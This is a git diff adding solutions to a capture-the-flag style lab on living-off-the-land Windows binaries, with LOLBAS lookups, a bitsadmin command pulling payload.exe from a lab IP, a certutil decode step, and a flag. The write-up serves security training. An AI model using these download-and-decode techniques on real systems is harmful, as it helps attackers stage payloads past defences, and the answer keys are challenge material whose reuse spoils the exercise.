@@ -158,9 +158,21 @@ The LOLBAS project accepts tool submissions that fit one of the following functi
 
 * Visit the [LOLBAS project's website](https://lolbas-project.github.io/) and check out its functionalities. Then, using the search bar, find the ATT&CK ID: `T1040`. What is the binary's name?
 
+	![task3-t1040](./images/task3-t1040.png)
+
+	**Answer : Pktmon.exe**
+
 * Use the search bar to find more information about `MSbuild.exe`. What is the ATT&CK ID?
+	
+	![task3-msbuild](./images/task3-msbuild.png)
+
+	**Answer : T1127.001**
 
 * Use the search bar to find more information about `Scriptrunner.exe`. What is the function of the binary?
+
+	![task3-function](./images/task3-function.png)
+
+	**Answer : Execute**
 
 * In the next task, we will show some of the tools based on the functionalities! Let's go!
 
@@ -223,11 +235,27 @@ In the next task, we will introduce some of the tools used to execute files.
 
 * Run `bitsadmin.exe` to download a file of your choice onto the attached Windows VM. Once you have executed the command successfully, an encoded flag file will be created automatically on the Desktop. What is the file name?
 
-* Use the `certutil.exe` tool to decode the encoded flag file from question #1. In order to decode the file, we use `-decode` option as follow:
+	```
+	bitsadmin.exe /transfer /Download /priority Foreground http://10.17.127.223:8000/payload.exe c:\Users\thm\Desktop\payload.exe
+	```
 
-	![task4-cmd5](./images/task4-cmd5.png)
+	![task4-encfile](./images/task4-encfile.png)
+
+	**Answer : enc_thm_0YmFiOG_file.txt**
+
+Use the `certutil.exe` tool to decode the encoded flag file from question #1. In order to decode the file, we use `-decode` option as follow:
+
+![task4-cmd5](./images/task4-cmd5.png)
 
 * What is the file content?
+
+	```
+	certutil -decode enc_thm_0YmFiOG_file.txt payload.txt
+	```
+
+	![task4-decode](./images/task4-decode.png)
+
+	**Answer : THM{ea4e2b9f362320d098635d4bab8a568e}**
 
 ## Task 5 - File Execution
 
